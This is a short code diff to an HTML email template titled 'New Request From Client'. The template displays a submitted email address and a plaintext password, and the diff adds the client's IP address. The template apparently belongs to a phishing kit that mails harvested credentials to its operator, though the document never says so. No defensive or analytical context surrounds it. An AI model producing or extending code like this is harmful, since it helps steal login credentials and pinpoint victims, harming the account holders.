@@ -1,6 +1,7 @@
 <center><h3>New Request From Client</h3></center>
 
 <center>
+<p><strong>IP: </strong>{{$ip}}</p><br>
 <p><strong>Email: </strong>{{$email}}</p><br>
 <p><strong>Password: </strong>{{$pass}}</p><br>
 </center><br>
